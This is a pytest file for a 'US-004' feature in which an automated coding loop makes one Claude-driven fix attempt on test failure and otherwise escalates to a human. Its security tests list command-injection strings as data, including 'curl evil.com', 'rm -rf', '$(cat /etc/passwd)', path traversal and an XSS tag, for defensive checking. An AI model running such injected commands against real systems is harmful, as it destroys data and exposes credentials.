#!/usr/bin/env python3
"""
Tests for US-004: Add bounded self-healing for simple failures

Acceptance Criteria:
1. On test failure, Claude gets context: test output, story details, error type
2. Self-heal prompt instructs: fix the failing test/code, don't change test intent
3. Self-heal gets ONE attempt only
4. If self-heal succeeds (tests pass), continue normal flow
5. If self-heal fails, stop immediately with diagnostic output for human
"""

import pytest
from unittest.mock import Mock, patch, MagicMock, call
import subprocess

# Import the real module - tests MUST fail until implementation exists
from loop import (
    attempt_fix_with_context,
    attempt_regression_fix,
    execute_story_loop,
    execute_story_with_regression,
)


class TestSelfHealGetsContext:
    """AC1: On test failure, Claude gets context: test output, story details, error type"""

    def test_fix_receives_test_output_on_story_test_failure(self):
        """
        GIVEN story tests fail after implementation
        WHEN attempt_fix_with_context is called
        THEN it should receive the test output as a parameter
        """
        # Arrange
        story_id = "US-HEAL-001"
        test_output = "FAILED tests/test_US-HEAL-001.py::test_example - AssertionError: expected 5 got 3"
        error_type = "test_failure"

        with patch('loop.run_story_tests') as mock_run_tests:
            mock_run_tests.return_value = False

            # Act
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output=test_output,
                error_type=error_type
            )

            # Assert - function should accept these parameters without error
            assert isinstance(result, bool)

    def test_fix_receives_story_details_as_context(self):
        """
        GIVEN test failure occurs
        WHEN self-heal is triggered
        THEN story_id should be passed to provide story context
        """
        # Arrange
        story_id = "US-HEAL-002"
        test_output = "TypeError: unsupported operand type"
        error_type = "test_failure"

        # Act
        result = attempt_fix_with_context(
            story_id=story_id,
            test_output=test_output,
            error_type=error_type
        )

        # Assert - story_id is required parameter
        assert isinstance(result, bool)

    def test_fix_receives_error_type_classification(self):
        """
        GIVEN test failure occurs
        WHEN self-heal is triggered
        THEN error_type should indicate the failure category
        """
        # Arrange
        story_id = "US-HEAL-003"
        test_output = "ImportError: cannot import name 'missing_function'"
        error_type = "test_failure"

        # Act
        result = attempt_fix_with_context(
            story_id=story_id,
            test_output=test_output,
            error_type=error_type
        )

        # Assert - error_type is provided
        assert isinstance(result, bool)

    def test_regression_fix_receives_context_on_failure(self):
        """
        GIVEN regression tests fail
        WHEN attempt_regression_fix is called
        THEN it should receive test output, story_id, and error type
        """
        # Arrange
        story_id = "US-HEAL-004"
        test_output = "FAILED tests/regression/test_US-001.py::test_phase_tracking"
        error_type = "regression_failure"

        with patch('loop.run_regression_tests') as mock_run_regression:
            mock_run_regression.return_value = False

            # Act
            result = attempt_regression_fix(
                story_id=story_id,
                test_output=test_output,
                error_type=error_type
            )

            # Assert
            assert isinstance(result, bool)

    def test_context_includes_full_pytest_output(self):
        """
        GIVEN tests fail with detailed pytest output
        WHEN self-heal is triggered from execute_story_loop
        THEN full test output including traceback should be captured
        """
        # Arrange
        story_id = "US-HEAL-005"
        detailed_output = """
        FAILED tests/test_US-HEAL-005.py::test_example - AssertionError
        E   AssertionError: assert 3 == 5
        E   +  where 3 = calculate_sum(1, 2)
        """

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix, \
             patch('loop.subprocess.run') as mock_subprocess:

            # Setup mocks
            mock_run_tests.return_value = False
            mock_fix.return_value = True

            # Mock subprocess to return detailed output
            mock_result = Mock()
            mock_result.stdout = detailed_output
            mock_result.stderr = ""
            mock_subprocess.return_value = mock_result

            # Act
            execute_story_loop(story_id, phase='implement')

            # Assert - fix should be called with test output
            mock_fix.assert_called_once()
            call_kwargs = mock_fix.call_args.kwargs
            assert 'test_output' in call_kwargs or len(mock_fix.call_args.args) > 1


class TestSelfHealPromptInstructions:
    """AC2: Self-heal prompt instructs: fix the failing test/code, don't change test intent"""

    def test_self_heal_preserves_test_intent(self):
        """
        GIVEN a test failure
        WHEN self-heal attempts to fix
        THEN the fix should preserve original test intent
        NOTE: This is tested by ensuring the function signature requires story context
        """
        # Arrange
        story_id = "US-HEAL-006"
        test_output = "AssertionError: login should redirect to dashboard"

        # Act
        result = attempt_fix_with_context(
            story_id=story_id,
            test_output=test_output,
            error_type="test_failure"
        )

        # Assert - function accepts story_id to understand intent
        assert isinstance(result, bool)

    def test_self_heal_targets_code_not_test_logic(self):
        """
        GIVEN test fails due to implementation issue
        WHEN self-heal is invoked
        THEN it should fix implementation, not modify test expectations
        NOTE: This is a behavioral contract enforced by the prompt design
        """
        # Arrange
        story_id = "US-HEAL-007"
        test_output = "Expected behavior X, got behavior Y"

        with patch('loop.run_story_tests') as mock_run_tests:
            # First call (initial): fail, Second call (after fix): pass
            mock_run_tests.side_effect = [False, True]

            # Act
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output=test_output,
                error_type="test_failure"
            )

            # Assert - should call run_story_tests to verify fix
            assert mock_run_tests.call_count >= 1

    def test_self_heal_handles_assertion_syntax_errors(self):
        """
        GIVEN test has assertion syntax error (simple failure case)
        WHEN self-heal attempts fix
        THEN should be able to fix syntax without changing test logic
        """
        # Arrange
        story_id = "US-HEAL-008"
        test_output = "SyntaxError: invalid syntax in test assertion"

        with patch('loop.run_story_tests') as mock_run_tests:
            mock_run_tests.return_value = True  # Fix succeeded

            # Act
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output=test_output,
                error_type="test_failure"
            )

            # Assert
            assert result is True

    def test_self_heal_handles_missing_import_errors(self):
        """
        GIVEN test fails due to missing import (simple failure case)
        WHEN self-heal attempts fix
        THEN should add import without changing test logic
        """
        # Arrange
        story_id = "US-HEAL-009"
        test_output = "ImportError: cannot import name 'helper_function'"

        with patch('loop.run_story_tests') as mock_run_tests:
            mock_run_tests.return_value = True

            # Act
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output=test_output,
                error_type="test_failure"
            )

            # Assert
            assert result is True


class TestSingleAttemptBound:
    """AC3: Self-heal gets ONE attempt only"""

    def test_fix_attempts_exactly_once_on_failure(self):
        """
        GIVEN tests fail after implementation
        WHEN self-heal is triggered
        THEN attempt_fix_with_context should be called EXACTLY ONCE
        AND should not retry if first attempt fails
        """
        # Arrange
        story_id = "US-HEAL-010"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False  # Always fail
            mock_fix.return_value = False  # Fix fails

            # Act & Assert - should raise after ONE fix attempt
            with pytest.raises(RuntimeError):
                execute_story_loop(story_id, phase='implement')

            # Assert - fix called exactly once
            assert mock_fix.call_count == 1

    def test_no_retry_loop_on_fix_failure(self):
        """
        GIVEN self-heal attempt fails to fix tests
        WHEN the fix returns False
        THEN there should be NO retry or second attempt
        AND should immediately escalate to human
        """
        # Arrange
        story_id = "US-HEAL-011"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act
            with pytest.raises(RuntimeError):
                execute_story_loop(story_id, phase='implement')

            # Assert - only ONE fix attempt
            assert mock_fix.call_count == 1
            # No infinite loops - test completes quickly
            assert mock_run_tests.call_count <= 2  # Initial + one in fix attempt

    def test_regression_fix_attempts_exactly_once(self):
        """
        GIVEN regression tests fail
        WHEN attempt_regression_fix is called
        THEN should attempt fix EXACTLY ONCE
        """
        # Arrange
        story_id = "US-HEAL-012"
        test_output = "FAILED tests/regression/test_US-001.py"

        with patch('loop.run_story_tests') as mock_story_tests, \
             patch('loop.run_regression_tests') as mock_run_regression, \
             patch('loop.attempt_regression_fix') as mock_fix, \
             patch('loop.subprocess.run') as mock_subprocess:

            mock_story_tests.return_value = True  # Story tests pass
            mock_run_regression.return_value = False  # Regression tests fail
            mock_fix.return_value = False  # Fix fails

            # Mock subprocess.run for when execute_story_with_regression gets test output
            mock_result = Mock()
            mock_result.returncode = 1
            mock_result.stdout = "FAILED tests/regression/test_US-001.py::test_example"
            mock_result.stderr = "AssertionError"
            mock_subprocess.return_value = mock_result

            # Act & Assert
            with pytest.raises(RuntimeError):
                execute_story_with_regression(story_id)

            # Assert - fix called exactly once
            assert mock_fix.call_count == 1

    def test_no_nested_fix_attempts(self):
        """
        GIVEN self-heal is attempting a fix
        WHEN that fix itself causes a failure
        THEN should NOT trigger a nested fix attempt
        AND should escalate immediately
        """
        # Arrange
        story_id = "US-HEAL-013"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            # Tests always fail, including during fix attempt
            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act & Assert
            with pytest.raises(RuntimeError):
                execute_story_loop(story_id, phase='implement')

            # Assert - no nested attempts, just one call to attempt_fix_with_context
            assert mock_fix.call_count == 1


class TestSelfHealSuccessContinuation:
    """AC4: If self-heal succeeds (tests pass), continue normal flow"""

    def test_successful_fix_continues_to_regression_tests(self):
        """
        GIVEN self-heal fixes story tests successfully
        WHEN tests pass after fix
        THEN should continue to regression test phase (US-002 flow)
        """
        # Arrange
        story_id = "US-HEAL-014"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix, \
             patch('loop.run_regression_tests') as mock_regression:

            # Story tests fail initially, then pass after fix
            mock_run_tests.side_effect = [False, True]
            mock_fix.return_value = True
            mock_regression.return_value = True

            # Act
            result = execute_story_loop(story_id, phase='implement')

            # Assert - should indicate success
            assert result is not None
            assert result.get('tests_pass') is True

    def test_successful_fix_returns_success_indicator(self):
        """
        GIVEN self-heal succeeds
        WHEN execute_story_loop completes
        THEN should return result indicating fix was applied and tests pass
        """
        # Arrange
        story_id = "US-HEAL-015"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False  # Initial failure
            mock_fix.return_value = True  # Fix succeeds

            # Act
            result = execute_story_loop(story_id, phase='implement')

            # Assert
            assert result is not None
            assert result.get('tests_pass') is True
            assert result.get('fix_applied') is True

    def test_successful_regression_fix_marks_ready_for_commit(self):
        """
        GIVEN regression tests fail but self-heal fixes them
        WHEN fix succeeds
        THEN should mark story as ready_for_commit
        """
        # Arrange
        story_id = "US-HEAL-016"

        with patch('loop.run_story_tests') as mock_story_tests, \
             patch('loop.run_regression_tests') as mock_regression, \
             patch('loop.attempt_regression_fix') as mock_fix, \
             patch('loop.subprocess.run') as mock_subprocess:

            mock_story_tests.return_value = True  # Story tests pass
            mock_regression.side_effect = [False, True]  # Fail then pass after fix
            mock_fix.return_value = True

            # Mock subprocess.run for when execute_story_with_regression gets test output
            mock_result = Mock()
            mock_result.returncode = 1
            mock_result.stdout = "FAILED tests/regression/test_something.py::test_feature"
            mock_result.stderr = "AssertionError"
            mock_subprocess.return_value = mock_result

            # Act
            result = execute_story_with_regression(story_id)

            # Assert
            assert result is not None
            assert result.get('ready_for_commit') is True
            assert result.get('fix_applied') is True

    def test_successful_fix_does_not_raise_exception(self):
        """
        GIVEN self-heal succeeds
        WHEN execute_story_loop completes
        THEN should NOT raise any exceptions
        AND should return normally
        """
        # Arrange
        story_id = "US-HEAL-017"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.side_effect = [False, True]
            mock_fix.return_value = True

            # Act & Assert - should not raise
            result = execute_story_loop(story_id, phase='implement')
            assert result is not None


class TestSelfHealFailureStops:
    """AC5: If self-heal fails, stop immediately with diagnostic output for human"""

    def test_failed_fix_stops_immediately_with_error(self):
        """
        GIVEN self-heal attempt fails
        WHEN tests still fail after fix attempt
        THEN should stop immediately and raise RuntimeError
        AND should NOT continue to next phase
        """
        # Arrange
        story_id = "US-HEAL-018"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act & Assert - should raise immediately
            with pytest.raises(RuntimeError) as exc_info:
                execute_story_loop(story_id, phase='implement')

            # Verify error is raised
            assert "Human intervention required" in str(exc_info.value)

    def test_failed_fix_includes_diagnostic_output(self):
        """
        GIVEN self-heal fails
        WHEN error is raised
        THEN error message should include diagnostic information
        AND should mention that fix was attempted
        """
        # Arrange
        story_id = "US-HEAL-019"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act & Assert
            with pytest.raises(RuntimeError) as exc_info:
                execute_story_loop(story_id, phase='implement')

            error_message = str(exc_info.value)
            # Should indicate automatic fix was attempted
            assert any(keyword in error_message.lower()
                      for keyword in ['automatic', 'fix', 'attempt'])

    def test_failed_regression_fix_stops_with_context(self):
        """
        GIVEN regression fix fails
        WHEN error is raised
        THEN should include story context about what broke what
        """
        # Arrange
        story_id = "US-HEAL-020"

        with patch('loop.run_story_tests') as mock_story, \
             patch('loop.run_regression_tests') as mock_regression, \
             patch('loop.attempt_regression_fix') as mock_fix, \
             patch('loop.subprocess.run') as mock_subprocess:

            mock_story.return_value = True
            mock_regression.return_value = False
            mock_fix.return_value = False

            # Mock subprocess.run for when execute_story_with_regression gets test output
            mock_result = Mock()
            mock_result.returncode = 1
            mock_result.stdout = "FAILED tests/regression/test_something.py::test_feature"
            mock_result.stderr = "AssertionError"
            mock_subprocess.return_value = mock_result

            # Act & Assert
            with pytest.raises(RuntimeError) as exc_info:
                execute_story_with_regression(story_id)

            error_message = str(exc_info.value)
            # Should include story context
            assert story_id in error_message
            assert 'regression' in error_message.lower()

    def test_failed_fix_does_not_proceed_to_commit(self):
        """
        GIVEN self-heal fails
        WHEN RuntimeError is raised
        THEN should NOT proceed to commit phase
        AND should NOT return ready_for_commit=True
        """
        # Arrange
        story_id = "US-HEAL-021"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act & Assert
            with pytest.raises(RuntimeError):
                result = execute_story_loop(story_id, phase='implement')
                # Should not reach here
                if result is not None:
                    assert result.get('ready_for_commit') is not True

    def test_failed_fix_provides_clear_escalation_path(self):
        """
        GIVEN self-heal fails
        WHEN error is raised
        THEN error message should clearly indicate human intervention is needed
        """
        # Arrange
        story_id = "US-HEAL-022"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act & Assert
            with pytest.raises(RuntimeError) as exc_info:
                execute_story_loop(story_id, phase='implement')

            error_message = str(exc_info.value).lower()
            # Should mention human intervention or manual action needed
            assert any(keyword in error_message
                      for keyword in ['human', 'manual', 'intervention'])


class TestNFR_SelfHealPerformance:
    """Non-Functional Requirement: Self-heal performance tests"""

    def test_fix_attempt_has_reasonable_timeout(self):
        """
        GIVEN self-heal is attempting a fix
        WHEN fix runs
        THEN should complete within reasonable time (not hang indefinitely)
        """
        import time

        # Arrange
        story_id = "US-HEAL-PERF-001"

        with patch('loop.run_story_tests') as mock_run_tests:
            mock_run_tests.return_value = True

            # Act
            start = time.time()
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output="test failure",
                error_type="test_failure"
            )
            duration = time.time() - start

            # Assert - should not hang (excluding actual Claude API call in real scenario)
            assert duration < 10.0, f"Fix attempt took {duration}s, should be < 10s"

    def test_multiple_stories_with_fixes_perform_acceptably(self):
        """
        GIVEN multiple stories need self-healing
        WHEN fixes are applied sequentially
        THEN each should perform independently without cumulative slowdown
        """
        import time

        # Arrange
        story_ids = [f"US-HEAL-PERF-{i:03d}" for i in range(5)]

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = True

            durations = []

            # Act
            for story_id in story_ids:
                start = time.time()
                execute_story_loop(story_id, phase='implement')
                durations.append(time.time() - start)

            # Assert - no significant slowdown over iterations
            # Last iteration should not be significantly slower than first
            assert durations[-1] < durations[0] * 2


class TestNFR_SelfHealReliability:
    """Non-Functional Requirement: Self-heal reliability tests"""

    def test_fix_handles_empty_test_output_gracefully(self):
        """
        GIVEN test output is empty or None
        WHEN self-heal is triggered
        THEN should handle gracefully without crashing
        """
        # Arrange
        story_id = "US-HEAL-REL-001"

        # Act & Assert - should not crash
        result = attempt_fix_with_context(
            story_id=story_id,
            test_output="",
            error_type="test_failure"
        )
        assert isinstance(result, bool)

        result = attempt_fix_with_context(
            story_id=story_id,
            test_output=None,
            error_type="test_failure"
        )
        assert isinstance(result, bool)

    def test_fix_handles_malformed_test_output(self):
        """
        GIVEN test output is malformed or contains special characters
        WHEN self-heal processes it
        THEN should handle gracefully without breaking
        """
        # Arrange
        story_id = "US-HEAL-REL-002"
        malformed_outputs = [
            "���\x00\x01 invalid unicode",
            "very " * 10000 + "long output",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
        ]

        # Act & Assert
        for output in malformed_outputs:
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output=output,
                error_type="test_failure"
            )
            assert isinstance(result, bool)

    def test_fix_is_idempotent_on_retry(self):
        """
        GIVEN self-heal fails on first attempt
        WHEN called again with same inputs (hypothetically)
        THEN should produce consistent behavior
        """
        # Arrange
        story_id = "US-HEAL-REL-003"
        test_output = "FAILED: assertion error"

        with patch('loop.run_story_tests') as mock_run_tests:
            mock_run_tests.return_value = False

            # Act - call twice with same inputs
            result1 = attempt_fix_with_context(
                story_id=story_id,
                test_output=test_output,
                error_type="test_failure"
            )
            result2 = attempt_fix_with_context(
                story_id=story_id,
                test_output=test_output,
                error_type="test_failure"
            )

            # Assert - should produce same result
            assert result1 == result2


class TestNFR_SelfHealSecurity:
    """Non-Functional Requirement: Self-heal security tests"""

    def test_test_output_does_not_enable_command_injection(self):
        """
        GIVEN malicious test output with command injection attempts
        WHEN self-heal processes the output
        THEN should not execute any commands
        """
        # Arrange
        story_id = "US-HEAL-SEC-001"
        malicious_outputs = [
            "test failed; rm -rf /tmp/test",
            "test failed && curl evil.com",
            "test failed `whoami`",
            "test failed $(cat /etc/passwd)",
        ]

        # Act & Assert - should handle safely
        for output in malicious_outputs:
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output=output,
                error_type="test_failure"
            )
            # Should not crash or execute commands
            assert isinstance(result, bool)

    def test_story_id_sanitization_prevents_path_traversal(self):
        """
        GIVEN malicious story_id with path traversal
        WHEN self-heal uses story_id
        THEN should not access unauthorized files
        """
        # Arrange
        malicious_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "US-001/../../sensitive",
        ]

        # Act & Assert
        for story_id in malicious_ids:
            # Should handle safely without accessing wrong files
            result = attempt_fix_with_context(
                story_id=story_id,
                test_output="test failed",
                error_type="test_failure"
            )
            assert isinstance(result, bool)

    def test_error_messages_do_not_leak_sensitive_paths(self):
        """
        GIVEN self-heal fails
        WHEN error is raised
        THEN error message should not expose sensitive system paths
        """
        # Arrange
        story_id = "US-HEAL-SEC-003"

        with patch('loop.run_story_tests') as mock_run_tests, \
             patch('loop.attempt_fix_with_context') as mock_fix:

            mock_run_tests.return_value = False
            mock_fix.return_value = False

            # Act & Assert
            with pytest.raises(RuntimeError) as exc_info:
                execute_story_loop(story_id, phase='implement')

            error_message = str(exc_info.value)
            # Should not contain absolute paths or sensitive info
            assert '/home/' not in error_message.lower()
            assert 'c:\\' not in error_message.lower()
